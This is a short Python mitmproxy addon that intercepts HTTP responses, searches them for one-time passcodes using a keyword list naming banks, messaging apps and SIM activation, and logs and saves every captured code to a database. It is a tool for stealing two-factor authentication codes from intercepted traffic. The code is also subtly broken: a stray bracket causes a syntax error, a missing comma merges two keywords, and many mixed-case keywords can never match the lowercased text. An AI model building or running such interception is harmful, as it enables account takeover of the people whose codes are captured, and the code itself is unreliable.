import mitmproxy.http
from mitmproxy import ctx
import re
from db_manager import save_otp

# Define common OTP keywords to filter out OTP messages
OTP_KEYWORDS = [
    "otp", "one-time passcode", "security code", "verification code",
    "two-factor code", "2fa code", "authentication code", "login code",
    "confirmation code", "sms code" "OTP", "One-Time Password", "Verification Code", "Auth Code", "Secure Code", "Passcode",
    "Your verification code", "Your login code", "Enter your code", "Use this code",
    "Transaction Code", "Bank Code", "Security Code", "Payment Code", "Card Code", "Deposit Code",
    "Email Verification Code", "Account Code", "Login Code", "Confirmation Code", "Identity Code",
    "Reset Password Code", "Password Recovery Code", "Security Alert Code",
    "Instagram Code", "Facebook Code", "WhatsApp Code", "Telegram Code", "Google Code", "Apple ID Code",
    "Amazon OTP", "eBay Code", "Shopify Code", "Order Verification", "Delivery Confirmation Code",
    "Two-Factor Authentication", "2FA Code", "Authenticator Code", "Login Confirmation",
    "SIM Activation Code", "Phone Verification", "Carrier Code", "Mobile Code"
]

]

def detect_otp(text):
    """Extract OTP from intercepted messages"""
    for keyword in OTP_KEYWORDS:
        if keyword in text.lower():
            otp_match = re.search(r'\b\d{4,8}\b', text)
            if otp_match:
                return otp_match.group(0)
    return None

def response(flow: mitmproxy.http.HTTPFlow):
    """Intercept HTTP responses and check for OTPs"""
    if flow.response and flow.response.content:
        content = flow.response.content.decode(errors="ignore")
        otp = detect_otp(content)
        if otp:
            ctx.log.info(f"Captured OTP: {otp}")
            save_otp(otp)  # Save to database

